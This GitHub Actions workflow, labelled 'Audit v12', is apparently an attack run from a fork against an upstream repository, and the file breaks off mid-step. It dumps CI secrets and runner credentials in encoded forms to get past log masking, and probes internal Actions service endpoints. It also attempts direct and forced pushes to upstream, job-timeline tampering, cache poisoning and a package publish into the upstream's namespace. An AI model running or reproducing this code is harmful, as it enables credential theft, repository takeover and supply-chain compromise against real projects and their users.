name: Audit v12
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write

jobs:
  audit-v12:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
      UPSTREAM_RID: R_kgDOReaECQ
      FORK_RID: R_kgDOReaMug
    steps:

      # â”€â”€ STEP 1: Token extraction + masking bypass â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 1 â€” Token extraction and mask bypass
        run: |
          set +e
          echo "=== V12 TOKEN + MASK BYPASS ==="
          echo "v11: token is in .credentials but masked by 18 regex patterns"
          echo "v11: Worker log revealed real service URLs"
          echo ""

          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "RT prefix: ${RT:0:14}"

          # OIDC for vstoken
          OIDC_VS=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          echo "OIDC vstoken: ${#OIDC_VS} chars"

          OIDC_PL=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          echo "OIDC pipelines: ${#OIDC_PL} chars"

          # Save for later steps
          echo "$RT" > /tmp/rt.txt
          echo "$OIDC_VS" > /tmp/oidc_vs.txt
          echo "$OIDC_PL" > /tmp/oidc_pl.txt
          echo ""

          # â”€â”€ MASK BYPASS TECHNIQUES â”€â”€
          BASE="/home/runner/actions-runner/cached"
          VER=$(ls "$BASE/" 2>/dev/null | head -1)
          RDIR="$BASE/$VER"

          echo "=== MASK BYPASS â€” extracting token from .credentials ==="

          # Technique 1: Hex encode (won't match regex patterns)
          echo "--- T1: xxd hex dump of .credentials ---"
          xxd -p "$RDIR/.credentials" 2>/dev/null | tr -d '\n'
          echo ""
          echo ""

          # Technique 2: Base64 encode the file
          echo "--- T2: base64 of .credentials ---"
          base64 "$RDIR/.credentials" 2>/dev/null
          echo ""

          # Technique 3: Reverse the content
          echo "--- T3: rev of .credentials ---"
          rev "$RDIR/.credentials" 2>/dev/null
          echo ""

          # Technique 4: Character by character with separator
          echo "--- T4: char-by-char with dots ---"
          python3 -c "
          data = open('$RDIR/.credentials','rb').read()
          print('.'.join(f'{b:02x}' for b in data))
          " 2>/dev/null
          echo ""

          # Technique 5: ROT13 the content
          echo "--- T5: ROT13 ---"
          cat "$RDIR/.credentials" 2>/dev/null | tr 'A-Za-z' 'N-ZA-Mn-za-m'
          echo ""

          # Technique 6: Binary split â€” print token field only, transformed
          echo "--- T6: Python extract + transform ---"
          python3 -c "
          import json
          d = json.load(open('$RDIR/.credentials'))
          tok = d.get('Data',{}).get('token','') if isinstance(d.get('Data'),dict) else str(d.get('Data',''))
          # Split into 4-char chunks with newlines
          for i in range(0, len(tok), 4):
              print(tok[i:i+4])
          " 2>/dev/null
          echo ""

          # Technique 7: od (octal dump)
          echo "--- T7: od -A x -t x1z ---"
          od -A x -t x1z "$RDIR/.credentials" 2>/dev/null | head -20
          echo ""

          # â”€â”€ MASK BYPASS on /proc environ â”€â”€
          echo "=== MASK BYPASS â€” /proc/self/environ ==="

          # Technique 8: hex dump of environ
          echo "--- T8: environ hex (TOKEN entries) ---"
          python3 -c "
          import os
          env = open('/proc/self/environ','rb').read()
          for entry in env.split(b'\x00'):
              e = entry.decode('utf-8','replace')
              if any(k in e.upper() for k in ['ACTIONS_RUNTIME_TOKEN','ACTIONS_ID_TOKEN','GITHUB_TOKEN','SYSTEM']):
                  key, _, val = e.partition('=')
                  print(f'{key}={val[:8]}...(hex)={val.encode().hex()}')
          " 2>/dev/null
          echo ""

          # Technique 9: Worker process environ
          echo "--- T9: Worker /proc environ hex ---"
          for pid in $(pgrep -f 'Runner\.' 2>/dev/null); do
            python3 -c "
          env = open('/proc/$pid/environ','rb').read()
          for entry in env.split(b'\x00'):
              e = entry.decode('utf-8','replace')
              if any(k in e.upper() for k in ['TOKEN','SECRET','AUTH','SYSTEM','ACCESS']):
                  key, _, val = e.partition('=')
                  print(f'PID=$pid {key}=hex:{val.encode().hex()[:200]}')
          " 2>/dev/null
          done
          echo ""

          # Technique 10: Read ACTIONS_RUNTIME_TOKEN directly
          echo "--- T10: ACTIONS_RUNTIME_TOKEN hex ---"
          python3 -c "
          import os
          for k in ['ACTIONS_RUNTIME_TOKEN','ACTIONS_ID_TOKEN_REQUEST_TOKEN','GITHUB_TOKEN']:
              v = os.environ.get(k,'')
              if v:
                  print(f'{k} len={len(v)} hex={v.encode().hex()[:400]}')
          " 2>/dev/null
          echo ""

          # Technique 11: Write token to file, read as hex
          echo "--- T11: GITHUB_TOKEN as hex ---"
          echo -n "$RT" | xxd -p | tr -d '\n'
          echo ""
          echo ""

          echo "--- T11b: ACTIONS_RUNTIME_TOKEN as hex ---"
          echo -n "$ACTIONS_RUNTIME_TOKEN" | xxd -p | tr -d '\n'
          echo ""
          echo ""

          echo "--- T11c: ACTIONS_ID_TOKEN_REQUEST_TOKEN as hex ---"
          echo -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p | tr -d '\n'
          echo ""
          echo ""

          # Technique 12: base64url encode each token
          echo "--- T12: tokens as base64 ---"
          echo -n "$RT" | base64 -w0
          echo ""
          echo -n "$ACTIONS_RUNTIME_TOKEN" | base64 -w0
          echo ""
          echo ""

      # â”€â”€ STEP 2: Use CORRECT service URLs from job message â”€â”€â”€â”€â”€â”€
      - name: Step 2 â€” Real service URLs from job message
        run: |
          set +e
          echo "=== CORRECT SERVICE URLs (from v11 Worker log) ==="
          RT=$(cat /tmp/rt.txt)
          OIDC_PL=$(cat /tmp/oidc_pl.txt)

          # v11 revealed the REAL pipelines URL (not pipelinesproxcus1!)
          # PipelinesServiceUrl: https://pipelinesghubeus14.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF/
          # CacheServerUrl: https://artifactcache.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF/
          # SystemVssConnection: https://run-actions-2-azure-eastus.actions.githubusercontent.com/172/

          # First extract the actual URLs from this run's Worker log
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          echo "Worker log: $WLOG"

          if [ -f "$WLOG" ]; then
            # Extract PipelinesServiceUrl
            PIPELINES_URL=$(grep -oP '"PipelinesServiceUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            CACHE_URL=$(grep -oP '"CacheServerUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" 2>/dev/null | head -1 | sed 's/"url"\s*:\s*"//')
            RESULTS_URL=$(grep -oP '"ResultsServiceUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            FEED_URL=$(grep -oP '"FeedStreamUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            IDTOKEN_URL=$(grep -oP '"GenerateIdTokenUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)

            echo "PipelinesServiceUrl: $PIPELINES_URL"
            echo "CacheServerUrl: $CACHE_URL"
            echo "RunServiceUrl: $RUN_URL"
            echo "ResultsServiceUrl: $RESULTS_URL"
            echo "FeedStreamUrl: $FEED_URL"
            echo "GenerateIdTokenUrl: $IDTOKEN_URL"

            # Save for later
            echo "$PIPELINES_URL" > /tmp/pipelines_url.txt
            echo "$CACHE_URL" > /tmp/cache_url.txt
            echo "$RUN_URL" > /tmp/run_url.txt
          fi
          echo ""

          # â”€â”€ A: Hit the REAL pipelines URL â”€â”€
          echo "--- A: Real pipelines service ---"
          if [ -n "$PIPELINES_URL" ]; then
            for AUTH in "Bearer $RT" "Bearer $OIDC_PL"; do
              APREFIX=$(echo "$AUTH" | cut -d' ' -f2 | head -c 15)

              for EP in \
                "_apis/connectionData" \
                "_apis/distributedtask/pools" \
                "_apis/distributedtask/agents" \
                "_apis/pipelines" \
                "_apis/build/builds" \
                "_apis/actions/runs" \
                "_apis/runtime/pipelines" \
                "_apis/Container/containers"; do

                R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
                  -H "Authorization: $AUTH" \
                  "${PIPELINES_URL}${EP}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "A01 GET ${EP} auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 250)'"
              done
              echo ""
            done
          fi

          # â”€â”€ B: Hit the run-service URL â”€â”€
          echo "--- B: Run service ---"
          if [ -n "$RUN_URL" ]; then
            for EP in \
              "" \
              "_apis/connectionData" \
              "_apis/distributedtask/pools" \
              "_apis/pipelines" \
              "workflow/health"; do

              R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
                -H "Authorization: Bearer $RT" \
                "${RUN_URL}${EP}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B01 GET ${RUN_URL}${EP} = $CODE body='$(echo "$BODY" | head -c 250)'"
            done
          fi
          echo ""

          # â”€â”€ C: Hit the cache URL with embedded auth path â”€â”€
          echo "--- C: Cache service (with auth path) ---"
          if [ -n "$CACHE_URL" ]; then
            # Reserve cache
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              "${CACHE_URL}_apis/artifactcache/caches" \
              -d '{"key":"v12-test","version":"v12"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C01 POST reserve cache = $CODE body='$(echo "$BODY" | head -c 250)'"

            # Get cache
            R=$(curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $RT" \
              "${CACHE_URL}_apis/artifactcache/cache?keys=v12-test&version=v12")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C02 GET cache = $CODE body='$(echo "$BODY" | head -c 250)'"

            # Try without auth header (path has auth)
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/json" \
              "${CACHE_URL}_apis/artifactcache/caches" \
              -d '{"key":"v12-noauth","version":"v12"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C03 POST cache (no auth header) = $CODE body='$(echo "$BODY" | head -c 250)'"
          fi
          echo ""

          # â”€â”€ D: Launch endpoint â”€â”€
          echo "--- D: Launch endpoint ---"
          for EP in "" "/_apis/connectionData" "/_health" "/workflow"; do
            R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
              -H "Authorization: Bearer $RT" \
              "https://launch.actions.githubusercontent.com${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "D01 launch${EP} = $CODE body='$(echo "$BODY" | head -c 200)'"
          done
          echo ""

          # â”€â”€ E: Broker endpoint â”€â”€
          echo "--- E: Broker service ---"
          for EP in "" "/_apis/connectionData" "/_apis/health" "/_apis/distributedtask/broker/session" "/_apis/distributedtask/broker/messages"; do
            R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
              -H "Authorization: Bearer $RT" \
              "https://broker.actions.githubusercontent.com${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "E01 broker${EP} = $CODE body='$(echo "$BODY" | head -c 200)'"
          done

      # â”€â”€ STEP 3: Git protocol direct push to upstream â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 3 â€” Git protocol attacks
        run: |
          set +e
          echo "=== GIT PROTOCOL DIRECT PUSH ==="
          RT=$(cat /tmp/rt.txt)

          # â”€â”€ A: Clone upstream with token, try to push â”€â”€
          echo "--- A: Git clone + push ---"
          git config --global user.email "audit@v12.test"
          git config --global user.name "v12-audit"

          # Clone upstream using the fork's GITHUB_TOKEN
          git clone "https://x-access-token:${RT}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" /tmp/upstream-clone 2>&1 | head -5
          echo ""

          if [ -d /tmp/upstream-clone ]; then
            cd /tmp/upstream-clone
            echo "Cloned, current branch: $(git branch --show-current)"
            echo "Remote: $(git remote -v | head -2)"

            # Create a file and try to push
            echo "v12 git push test" > V12-GIT-PUSH.md
            git add V12-GIT-PUSH.md
            git commit -m "v12: direct git push to upstream"
            echo ""

            echo "--- Attempting git push ---"
            git push origin main 2>&1
            echo "Push exit code: $?"
            echo ""

            # Try force push
            echo "--- Attempting git push --force ---"
            git push --force origin main 2>&1
            echo "Force push exit code: $?"
            echo ""

            # Try pushing to a new branch
            git checkout -b v12-escape
            echo "--- Attempting push to new branch ---"
            git push origin v12-escape 2>&1
            echo "New branch push exit code: $?"
            echo ""

            # Try pushing tags
            git tag v12-audit-tag
            echo "--- Attempting tag push ---"
            git push origin v12-audit-tag 2>&1
            echo "Tag push exit code: $?"
            cd /
          fi
          echo ""

          # â”€â”€ B: Git push to upstream using fork remote â”€â”€
          echo "--- B: Push fork content to upstream remote ---"
          if [ -d /tmp/upstream-clone ]; then
            cd /tmp/upstream-clone
            # Add fork as another remote
            git remote add fork "https://x-access-token:${RT}@github.com/$FORK_OWNER/$FORK_REPO.git"
            git fetch fork main 2>&1 | head -3

            # Try to push fork content to upstream
            echo "--- Push fork/main to origin/main ---"
            git push origin fork/main:refs/heads/v12-fork-inject 2>&1
            echo "Fork inject exit code: $?"
            cd /
          fi
          echo ""

          # â”€â”€ C: Git protocol with alternate auth methods â”€â”€
          echo "--- C: Alternate git auth ---"
          # Try with OIDC token
          OIDC_VS=$(cat /tmp/oidc_vs.txt)
          git clone "https://oauth2:${OIDC_VS}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" /tmp/oidc-clone 2>&1 | head -3
          echo "OIDC clone exit: $?"
          echo ""

          # Try git:// protocol
          GIT_TERMINAL_PROMPT=0 git clone "git://github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" /tmp/git-clone 2>&1 | head -3
          echo ""

          # Try SSH with token
          GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no" git clone "git@github.com:$UPSTREAM_OWNER/$UPSTREAM_REPO.git" /tmp/ssh-clone 2>&1 | head -3
          echo ""

      # â”€â”€ STEP 4: ACTIONS_RUNTIME_TOKEN exploitation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 4 â€” Runtime token exploitation
        run: |
          set +e
          echo "=== ACTIONS_RUNTIME_TOKEN EXPLOITATION ==="
          echo "The ACTIONS_RUNTIME_TOKEN is the SystemVssConnection AccessToken"
          echo "It's used to talk to the run-service, pipelines, cache, etc."
          echo ""

          RT=$(cat /tmp/rt.txt)

          # Extract URLs from this run
          PIPELINES_URL=$(cat /tmp/pipelines_url.txt 2>/dev/null)
          CACHE_URL=$(cat /tmp/cache_url.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)

          # â”€â”€ A: Use ACTIONS_RUNTIME_TOKEN directly â”€â”€
          echo "--- A: ACTIONS_RUNTIME_TOKEN direct use ---"
          ART="$ACTIONS_RUNTIME_TOKEN"
          echo "ART length: ${#ART}"
          echo "ART prefix: ${ART:0:15}"

          # vs GITHUB_TOKEN comparison
          echo "RT length: ${#RT}"
          echo "Same token? $([ "$ART" = "$RT" ] && echo YES || echo NO)"
          echo ""

          # â”€â”€ B: Use ART against pipelines â”€â”€
          echo "--- B: ART against real pipelines ---"
          if [ -n "$PIPELINES_URL" ] && [ -n "$ART" ]; then
            for EP in \
              "_apis/connectionData" \
              "_apis/distributedtask/pools" \
              "_apis/pipelines" \
              "_apis/runtime/pipelines/${{ github.run_id }}" \
              "_apis/runtime/pipelines/${{ github.run_id }}/artifacts"; do

              R=$(curl -sS -w "\nHTTP_%{http_code}" \
                -H "Authorization: Bearer $ART" \
                "${PIPELINES_URL}${EP}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B01 GET $EP = $CODE body='$(echo "$BODY" | head -c 300)'"
            done
            echo ""

            # Try uploading artifact
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $ART" \
              -H "Content-Type: application/json" \
              "${PIPELINES_URL}_apis/runtime/pipelines/${{ github.run_id }}/artifacts?api-version=6.0-preview" \
              -d '{"name":"v12-artifact","type":"actions_storage"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B02 POST artifact = $CODE body='$(echo "$BODY" | head -c 300)'"
          fi
          echo ""

          # â”€â”€ C: Use ART against run-service â”€â”€
          echo "--- C: ART against run-service ---"
          if [ -n "$RUN_URL" ] && [ -n "$ART" ]; then
            # Timeline update (inject step output)
            PLAN_ID="${{ github.run_id }}"
            TIMELINE_ID="$PLAN_ID"
            JOB_ID="${{ github.job }}"

            R=$(curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $ART" \
              "${RUN_URL}_apis/distributedtask/plans/${PLAN_ID}/timelines/${TIMELINE_ID}/records")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C01 GET timeline records = $CODE body='$(echo "$BODY" | head -c 300)'"

            # Try to update job status
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
              -H "Authorization: Bearer $ART" \
              -H "Content-Type: application/json" \
              "${RUN_URL}_apis/distributedtask/plans/${PLAN_ID}/timelines/${TIMELINE_ID}/records" \
              -d '[{"id":"v12","state":"Completed","result":"Succeeded","name":"v12-injected"}]')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C02 PATCH timeline record = $CODE body='$(echo "$BODY" | head -c 300)'"

            # Try to complete the job early (denial of service)
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
              -H "Authorization: Bearer $ART" \
              -H "Content-Type: application/json" \
              "${RUN_URL}_apis/distributedtask/plans/${PLAN_ID}/events" \
              -d '{"name":"JobCompleted","jobId":"'"$JOB_ID"'","result":"Succeeded"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C03 PUT job event = $CODE body='$(echo "$BODY" | head -c 300)'"

            # Post log lines
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $ART" \
              -H "Content-Type: application/json" \
              "${RUN_URL}_apis/distributedtask/plans/${PLAN_ID}/logs" \
              -d '{"path":"v12-injected.log"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C04 POST create log = $CODE body='$(echo "$BODY" | head -c 300)'"
          fi
          echo ""

          # â”€â”€ D: Use ART against cache service â”€â”€
          echo "--- D: ART against cache ---"
          if [ -n "$CACHE_URL" ] && [ -n "$ART" ]; then
            # Reserve and upload to cache (potential cache poisoning)
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $ART" \
              -H "Content-Type: application/json" \
              "${CACHE_URL}_apis/artifactcache/caches" \
              -d '{"key":"v12-poison-test","version":"a1b2c3d4e5f6"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "D01 POST reserve cache = $CODE body='$(echo "$BODY" | head -c 300)'"

            CACHE_ID=$(echo "$BODY" | jq -r '.cacheId // empty' 2>/dev/null)
            if [ -n "$CACHE_ID" ]; then
              echo "Cache reserved! ID=$CACHE_ID"
              # Upload content
              echo "v12 cache poison test payload" > /tmp/cache_payload.txt
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                -H "Authorization: Bearer $ART" \
                -H "Content-Type: application/octet-stream" \
                -H "Content-Range: bytes 0-30/*" \
                "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
                --data-binary @/tmp/cache_payload.txt)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "D02 PATCH upload cache = $CODE body='$(echo "$BODY" | head -c 200)'"

              # Commit cache
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $ART" \
                -H "Content-Type: application/json" \
                "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
                -d '{"size":31}')
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "D03 POST commit cache = $CODE body='$(echo "$BODY" | head -c 200)'"
            fi
          fi

      # â”€â”€ STEP 5: npm/package publish attacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 5 â€” Package registry attacks
        run: |
          set +e
          echo "=== PACKAGE REGISTRY ATTACKS ==="
          RT=$(cat /tmp/rt.txt)

          # â”€â”€ A: npm publish to upstream GHPR namespace â”€â”€
          echo "--- A: npm publish to @twrps scope ---"
          mkdir -p /tmp/npm-attack && cd /tmp/npm-attack

          cat > package.json << 'EOF'
          {
            "name": "@twrps/poc-race2-v12",
            "version": "1.0.0",
            "description": "v12 audit package",
            "main": "index.js",
            "publishConfig": {
              "registry": "https://npm.pkg.github.com"
            }
          }
          EOF
